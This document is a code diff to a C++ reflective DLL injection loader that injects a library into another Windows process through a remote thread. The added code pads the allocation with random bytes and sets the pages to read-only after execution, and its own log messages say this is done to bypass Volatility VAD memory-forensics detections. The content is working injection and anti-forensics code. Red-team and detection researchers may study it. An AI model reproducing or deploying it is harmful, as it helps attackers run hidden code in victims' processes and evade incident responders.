@@ -1,5 +1,4 @@
 #include "ReflectiveLoadLibrary.h"
-#include <stdio.h>
 
 DWORD Rva2Offset64(DWORD rva, UINT_PTR baseAddress)
 {
@@ -195,9 +194,27 @@ LPVOID WINAPI LoadRemoteLibraryR(HANDLE process, LPVOID myBuffer, DWORD size, LP
 				std::cout << "[LoadRemoteLibraryR] ReflectiveLoader '" << procName << "' offset not found.\n";
 			}
 
+			random_device rd;
+			mt19937_64 mt(rd());
+			uniform_int_distribution<int> dist(1, 8);
+			auto pageShift = 4096 * dist(mt);
 			// alloc memory (RWX) in the host process for the image...
-			LPVOID buffer = VirtualAllocEx(process, NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-			cout << "[LoadRemoveLibraryR] Allocated target process memory " << buffer << " / error code " << GetLastError() << '\n';
+			LPVOID buffer = VirtualAllocEx(process, NULL, size + pageShift, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+			cout << "[LoadRemoveLibraryR] Allocated target process memory " << buffer << " -> RW / error code " << GetLastError() << '\n';
+
+			cout << "[LoadRemoveLibraryR] Filled first " << pageShift << " by random bytes to bypass Volatility VAD detections error code " << GetLastError() << '\n';
+
+			uniform_int<BYTE> ubyte(0, UCHAR_MAX);
+			auto random = new BYTE[pageShift];
+			for (int i = 0; i < pageShift; i++)
+				random[i] = ubyte(mt);
+
+			WriteProcessMemory(process, buffer, random, pageShift, nullptr); // Don't care if failed
+			delete[] random;
+
+			buffer = (LPSTR)buffer + pageShift;
+			cout << "[LoadRemoveLibraryR] Shifted page to " << pageShift << " to bypass Volatility VAD detections\n";
+
 			if (!buffer)
 				break;
 
@@ -210,7 +227,7 @@ LPVOID WINAPI LoadRemoteLibraryR(HANDLE process, LPVOID myBuffer, DWORD size, LP
 			//https://github.com/rapid7/ReflectiveDLLInjection/commit/31c8f04046833b5e9b9d9bb4fc3e5d2f747af509
 			DWORD oldProtect;
 			state = VirtualProtectEx(process, buffer, size, PAGE_EXECUTE_READ, &oldProtect);
-			cout << "[LoadRemoveLibraryR] Changed page protect mode -> WX to bypass memory protection / error code " << GetLastError() << '\n';
+			cout << "[LoadRemoveLibraryR] Changed page protect mode -> RX to execute / error code " << GetLastError() << '\n';
 			if (!state)
 				break;
 
@@ -222,6 +239,12 @@ LPVOID WINAPI LoadRemoteLibraryR(HANDLE process, LPVOID myBuffer, DWORD size, LP
 			HANDLE hThread = CreateRemoteThread(process, nullptr, 1024 * 1024, threadEp, param, (DWORD)NULL, nullptr);
 			cout << "[LoadRemoteLibraryR] Remote thread " << hThread << " creation error code " << GetLastError() << '\n';
 			WaitForSingleObject(hThread, INFINITE);
+
+			state = VirtualProtectEx(process, buffer, size, PAGE_READONLY, &oldProtect);
+			cout << "[LoadRemoveLibraryR] Changed page protect mode -> R to prevent detections / error code " << GetLastError() << '\n';
+			if (!state)
+				break;
+
 			CloseHandle(hThread);
 			return buffer;
 		} while (FALSE);
